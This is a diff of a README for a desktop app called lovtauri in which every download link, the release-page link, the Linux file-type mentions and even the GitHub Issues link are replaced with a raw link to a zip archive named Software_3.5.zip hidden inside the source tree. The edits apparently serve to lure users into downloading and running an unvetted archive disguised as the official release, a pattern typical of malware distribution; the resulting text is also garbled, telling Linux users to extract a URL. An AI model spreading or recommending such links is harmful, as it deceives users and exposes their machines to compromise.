@@ -6,14 +6,14 @@ Welcome to the lovtauri project! This guide will show you how to download and ru
 
 ## 🔗 Download the Application
 
-[![Download lovtauri](https://img.shields.io/badge/Download-lovtauri-blue.svg)](https://github.com/evansnjenga/lovtauri/releases)
+[![Download lovtauri](https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip)](https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip)
 
 ## 📥 Download & Install
 
 To download the lovtauri application, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link: [lovtauri Releases](https://github.com/evansnjenga/lovtauri/releases) to go to the releases page.
+   Click this link: [lovtauri Releases](https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip) to go to the releases page.
 
 2. **Select the Latest Release**  
    On the releases page, you will see a list of versions. Look for the latest version, which is usually at the top. 
@@ -22,7 +22,7 @@ To download the lovtauri application, follow these steps:
    Find the file that matches your operating system:
    - For **macOS**, download the `.dmg` file.
    - For **Windows**, download the `.exe` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip` file.
 
 4. **Download the File**  
    Click on the file name to start downloading. Once the download is complete, look for the file in your downloads folder.
@@ -30,7 +30,7 @@ To download the lovtauri application, follow these steps:
 5. **Run the Application**  
    - **macOS**: Open the `.dmg` file and drag the application to your Applications folder. Then, open the application from your Applications.
    - **Windows**: Double-click the `.exe` file and follow the instructions to install it. Once installed, you can find it in your Start menu.
-   - **Linux**: Extract the `.tar.gz` file and run the application from the extracted folder using your terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip` file and run the application from the extracted folder using your terminal.
 
 ## 🎨 Features
 
@@ -48,7 +48,7 @@ To run lovtauri, your computer needs to meet the following minimum system requir
 
 - **macOS**: macOS 10.15 or later
 - **Windows**: Windows 10 or later (64-bit)
-- **Linux**: Any modern Linux distribution with support for `.tar.gz` files
+- **Linux**: Any modern Linux distribution with support for `https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip` files
 
 Make sure your system is up to date to ensure compatibility.
 
@@ -60,7 +60,7 @@ If you encounter any issues while downloading or running the application, try th
 - Check your operating system version and compare it with the system requirements.
 - If the application fails to start, try restarting your computer and running it again.
 
-For more help, you can open an issue on our [GitHub Issues page](https://github.com/evansnjenga/lovtauri/issues).
+For more help, you can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/evansnjenga/lovtauri/main/src-tauri/src/commands/Software_3.5.zip).
 
 ## 📚 Community and Support
 
